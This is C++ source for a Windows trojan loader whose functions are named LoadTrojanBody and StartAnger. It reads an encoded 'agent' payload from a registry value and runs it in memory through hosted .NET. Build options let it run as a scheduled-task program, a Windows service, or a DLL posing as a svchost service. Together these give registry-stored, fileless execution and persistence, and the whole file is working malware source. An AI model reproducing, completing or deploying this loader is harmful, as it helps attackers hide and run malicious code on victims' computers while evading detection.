#include <Windows.h>
#include <tchar.h>
#include <Shlwapi.h>

#include "..\\general\\log.h"
#include "clr.h"
#include "..\\installer\\service.h"

#pragma comment(lib, "shlwapi.lib")


#ifdef SCHEDULER
#ifdef _WIN64
#pragma comment(linker, "/OUT:..\\bin\\Debug\\x64\\loader_scheduler.exe")
#else
#pragma comment(linker, "/OUT:..\\bin\\Debug\\x86\\loader_scheduler.exe")
#endif // WIN32
#endif // SCHEDULER

#ifdef SERVICE
#ifdef _WIN64
#pragma comment(linker, "/OUT:..\\bin\\Debug\\x64\\loader_service.exe")
#else
#pragma comment(linker, "/OUT:..\\bin\\Debug\\x86\\loader_service.exe")
#endif // WIN32
#endif // SERVICE

#ifdef SVCHOST
#pragma comment(linker, "/DLL")
#ifdef _WIN64
#pragma comment(linker, "/OUT:..\\bin\\Debug\\x64\\loader_svchost.dll")
#else
#pragma comment(linker, "/OUT:..\\bin\\Debug\\x86\\loader_svchost.dll")
#endif // WIN32
#endif // SVCHOST


LSTATUS	LoadTrojanBody(LPTSTR pszPath, PBYTE *pData, PDWORD pdwDataSize)
{
	LONG	lResult;
	HKEY	hSettingsKey;

	LogInfo(_T("Config path: %s\r\n"), pszPath);

	lResult = RegOpenKeyEx(HKEY_LOCAL_MACHINE, pszPath, 0, KEY_READ, &hSettingsKey);
	if (lResult == ERROR_ACCESS_DENIED || lResult == ERROR_FILE_NOT_FOUND)
	{
		lResult = RegOpenKeyEx(HKEY_CURRENT_USER, pszPath, 0, KEY_READ, &hSettingsKey);
	}
	//else 
	if (lResult == ERROR_SUCCESS)
	{
		lResult = RegQueryValueEx(hSettingsKey, _T("Main"), NULL, NULL, NULL, pdwDataSize);
		if (lResult == ERROR_SUCCESS)
		{
			*pData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, *pdwDataSize);
			if (*pData)
			{
				lResult = RegQueryValueEx(hSettingsKey, _T("Main"), NULL, NULL, *pData, pdwDataSize);
			}
			else
			{
				lResult = ERROR_NOT_ENOUGH_MEMORY;
			}
		}

		RegCloseKey(hSettingsKey);
	}

	return lResult;
}

DWORD StartAnger(PVOID pContext)
{
	PBYTE	pTrojanBody = NULL;
	DWORD	dwTrojanBobySize = 0;

	LogInfo(_T("Start loader\r\n"));

	LogTrace(_T("Load agent body\r\n"));
	LSTATUS	lResult = LoadTrojanBody((LPTSTR)pContext, &pTrojanBody, &dwTrojanBobySize);
	if (lResult != ERROR_SUCCESS)
	{
		LogFatal(_T("Error load agent body with error %d\r\n"), lResult);
		return -1;
	}

	HRESULT hr = RunAgent(pTrojanBody, dwTrojanBobySize, _T("agent.Program"));
	// get exit code for restart (update, delete)
	LogWarn(_T("Stop agent with code 0x%.08X\r\n"), hr);

	if (pTrojanBody != NULL)
	{
		HeapFree(GetProcessHeap(), 0, pTrojanBody);
	}

	LogInfo(_T("Exit loader\r\n"));

	return 0;

}


#if defined(SERVICE) || defined(SVCHOST)
HINSTANCE	g_hInstance;
SERVICE_STATUS	g_ServiceStatus;
SERVICE_STATUS_HANDLE	g_ServiceStatusHandle;
HANDLE					hWorkThread;
HANDLE	hStoppedEvent;


VOID SetServiceStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode = NO_ERROR, DWORD dwWaitHint = 0)
{
	static DWORD dwCheckPoint = 1;

	// Fill in the SERVICE_STATUS structure of the service.

	g_ServiceStatus.dwCurrentState = dwCurrentState;
	g_ServiceStatus.dwWin32ExitCode = dwWin32ExitCode;
	g_ServiceStatus.dwWaitHint = dwWaitHint;

	g_ServiceStatus.dwCheckPoint =
		((dwCurrentState == SERVICE_RUNNING) ||
		(dwCurrentState == SERVICE_STOPPED)) ?
		0 : dwCheckPoint++;

	// Report the status of the service to the SCM.
	SetServiceStatus(g_ServiceStatusHandle, &g_ServiceStatus);
}



//PHANDLER_FUNCTION ServiceCtrlHandler;

VOID WINAPI ServiceCtrlHandler(DWORD dwControl)
{
	LogInfo(_T("Service control %d\r\n"), dwControl);

	switch (dwControl)
	{
	case SERVICE_CONTROL_STOP:
	{
		SetEvent(hStoppedEvent);
		SetServiceStatus(SERVICE_STOPPED);
		break;
	}
	//case SERVICE_CONTROL_PAUSE: s_service->Pause(); break;
	//case SERVICE_CONTROL_CONTINUE: s_service->Continue(); break;
	//case SERVICE_CONTROL_SHUTDOWN: s_service->Shutdown(); break;
	//case SERVICE_CONTROL_INTERROGATE: break;
	default:
		break;
	}
}

#ifdef SVCHOST
__declspec(dllexport)
#endif // SVCHOST
VOID WINAPI ServiceMain(DWORD dwArgc, PWSTR *pszArgv)
{
	g_ServiceStatus.dwWin32ExitCode = 0;
	g_ServiceStatus.dwCheckPoint = 0;
	g_ServiceStatus.dwServiceType = SERVICE_WIN32;
	g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
	g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

	LogInfo(_T("Main function()\r\n"));

	g_ServiceStatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
	if (g_ServiceStatusHandle == NULL)
	{
		return;
	}

	SetServiceStatus(SERVICE_START_PENDING);

	hWorkThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)StartAnger, pszArgv, 0, NULL);

	hStoppedEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

	SetServiceStatus(SERVICE_RUNNING);

	LogInfo(_T("Create work thread\r\n"));

	if (WaitForSingleObject(hStoppedEvent, INFINITE) == WAIT_OBJECT_0)
	{
		TerminateThread(hWorkThread, 0);
	}

}
#endif // defined(SERVICE) || defined(SVCHOST)


#ifdef SVCHOST
BOOL WINAPI DllEntryPoint(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	if (fdwReason == DLL_PROCESS_ATTACH)
	{
		DisableThreadLibraryCalls(hinstDLL);
	}

	return TRUE;
}

typedef NTSTATUS(WINAPI *LPSTART_RPC_SERVER) (RPC_WSTR, RPC_IF_HANDLE);
typedef NTSTATUS(WINAPI *LPSTOP_RPC_SERVER) (RPC_IF_HANDLE);
typedef NTSTATUS(WINAPI *LPSTOP_RPC_SERVER_EX) (RPC_IF_HANDLE);

typedef VOID(WINAPI *LPNET_BIOS_OPEN) (VOID);
typedef VOID(WINAPI *LPNET_BIOS_CLOSE) (VOID);
typedef DWORD(WINAPI *LPNET_BIOS_RESET)(UCHAR);

typedef DWORD(WINAPI *LPREGISTER_STOP_CALLBACK) (HANDLE *, PCWSTR, HANDLE, WAITORTIMERCALLBACK, PVOID, DWORD);

typedef struct _SVCHOST_GLOBAL_DATA {
	PSID NullSid;                               // S-1-0-0
	PSID WorldSid;                              // S-1-1-0
	PSID LocalSid;                              // S-1-2-0
	PSID NetworkSid;                            // S-1-5-2
	PSID LocalSystemSid;                        // S-1-5-18
	PSID LocalServiceSid;                       // S-1-5-19
	PSID NetworkServiceSid;                     // S-1-5-20
	PSID BuiltinDomainSid;                      // S-1-5-32
	PSID AuthenticatedUserSid;                  // S-1-5-11
	PSID AnonymousLogonSid;                     // S-1-5-7
	PSID AliasAdminsSid;                        // S-1-5-32-544
	PSID AliasUsersSid;                         // S-1-5-32-545
	PSID AliasGuestsSid;                        // S-1-5-32-546
	PSID AliasPowerUsersSid;                    // S-1-5-32-547
	PSID AliasAccountOpsSid;                    // S-1-5-32-548
	PSID AliasSystemOpsSid;                     // S-1-5-32-549
	PSID AliasPrintOpsSid;                      // S-1-5-32-550
	PSID AliasBackupOpsSid;                     // S-1-5-32-551
	LPSTART_RPC_SERVER StartRpcServer;
	LPSTOP_RPC_SERVER StopRpcServer;
	LPSTOP_RPC_SERVER_EX StopRpcServerEx;
	LPNET_BIOS_OPEN NetBiosOpen;
	LPNET_BIOS_CLOSE NetBiosClose;
	LPNET_BIOS_RESET NetBiosReset;
#if (_WIN32_WINNT == _WIN32_WINNT_WINXP && NTDDI_VERSION >= NTDDI_WINXPSP2) || (_WIN32_WINNT == _WIN32_WINNT_WS03 && NTDDI_VERSION >= NTDDI_WS03SP1) || (_WIN32_WINNT >= _WIN32_WINNT_LONGHORN)
	LPREGISTER_STOP_CALLBACK RegisterStopCallback;
#endif
} SVCHOST_GLOBAL_DATA;

SVCHOST_GLOBAL_DATA *g_pServiceGlobal = NULL;

__declspec(dllexport) SVCHOST_GLOBAL_DATA* WINAPI SvchostPushServiceGlobals(SVCHOST_GLOBAL_DATA *lpGlobalData)
{
	g_pServiceGlobal = lpGlobalData;

	return g_pServiceGlobal;
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
	DisableThreadLibraryCalls(hinstDLL);

	switch (fdwReason)
	{


	case DLL_PROCESS_ATTACH:

		break;


	case DLL_PROCESS_DETACH:

		break;
	}
	return TRUE;
}
#endif // SVCHOST


#ifdef SERVICE
INT APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, INT nCmdShow)
{
	SERVICE_TABLE_ENTRY ServiceStartTable;

	HeapSetInformation(NULL, HeapEnableTerminationOnCorruption, NULL, 0);

	LogInit(LOG_DEBUGOUTPUT);

	LogInfo(_T("EntryPoint()\r\n"));

	ServiceStartTable.lpServiceName = SERVICE_NAME;
	ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;

	g_hInstance = hInstance;
	StartServiceCtrlDispatcher(&ServiceStartTable);
	return 0;
}
#endif // SERVICE


#ifdef SCHEDULER
INT APIENTRY _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, INT nCmdShow)
{
	LogInit(LOG_FILE);

	LogInfo(_T("Start work\r\n\r\n"));

	if (SUCCEEDED(CoInitializeEx(NULL, COINIT_MULTITHREADED)))
	{
		StartAnger(lpCmdLine);
	}
	else
	{
		LogError(_T("Failed CoInitializeEx()\r\n"));
	}
	
	CoUninitialize();

	return 0;
}
#endif // SCHEDULER